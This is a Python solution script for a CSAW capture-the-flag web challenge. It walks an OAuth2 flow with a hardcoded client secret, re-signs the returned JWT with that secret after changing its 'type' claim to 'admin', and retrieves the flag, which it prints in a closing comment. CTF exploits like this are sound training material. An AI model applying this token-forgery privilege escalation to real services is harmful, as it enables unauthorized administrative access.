# python 3
import requests
import re
import base64
import jwt

def get_code():
	url =  "http://web.chal.csaw.io:9000/oauth2/authorize"
	post_data = {
		'response_type': 'code',
		'client_id': 'admin',
		'redirect_uri': 'http://web.chal.csaw.io:9000/protected',
		'scope': 'http://web.chal.csaw.io:9000/protected',
		'client_secret': 'ufoundme!',
		'state': 'http://web.chal.csaw.io:9000/protected'
	}
	header = {
		'Content-Type': 'application/x-www-form-urlencoded',
	}
	req = requests.post(url=url, data=post_data, headers=header, allow_redirects=False, proxies={'http':'localhost:8080'})
	result = re.findall('Redirecting to(.*)">', req.text)[0]
	result = re.findall('code=(.*)&amp;', result)[0]
	return result

def get_token(code):
	url = 'http://web.chal.csaw.io:9000/oauth2/token'
	post_data = {
		'code': code,
		'state': 'http://web.chal.csaw.io:9000/protected',
		'grant_type': 'authorization_code',
		'redirect_uri': 'http://web.chal.csaw.io:9000/protected',
		'client_secret': 'ufoundme!',
		'client_id': 'admin',
	}
	header = {
		'Content-Type': 'application/x-www-form-urlencoded',
		'Origin': 'http://web.chal.csaw.io:9000',
	}
	res = requests.post(url=url, data=post_data, headers=header, allow_redirects=False, proxies={'http':'localhost:8080'})
	return res.json()['token']

def get_auth(token):
	url = 'http://web.chal.csaw.io:9000/protected'
	auth = 'Bearer {}'.format(token)
	header = {
		'Authorization': auth
	}
	res = requests.get(url=url, headers=header, allow_redirects=False, proxies={'http':'localhost:8080'})
	return res.text

def crack_sig_jwt(token):
	secret = 'ufoundme!'
	# Decode
	try:
		old = jwt.decode(token, secret, algorithms=['HS256']) 
	except:
		print( 'signature expire ')
		old = {"type":"user","secret":"ufoundme!","iat":1537063363,"exp":1537063963}
	new = old
	new['type'] = 'admin'
	# Encode
	new_token = jwt.encode(new, secret, algorithm='HS256')
	return new_token.decode()

if __name__ == '__main__':
	print( '$ Request to oauth2/authorize ...' )
	code = get_code()
	print( '> Code = ' + code )

	print( '$ Request to oauth2/token ...' )
	token = get_token(code)
	print( '> Token = ' + token )

	print( '$ Crack signature and change data ...' )
	new_token = crack_sig_jwt(token)
	print( '> New token = ' + new_token)

	print( '$ Request to /protected ...' )
	flag = get_auth(new_token)
	print( flag )

# crack jwt with secret
# Change type = admin
# flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}



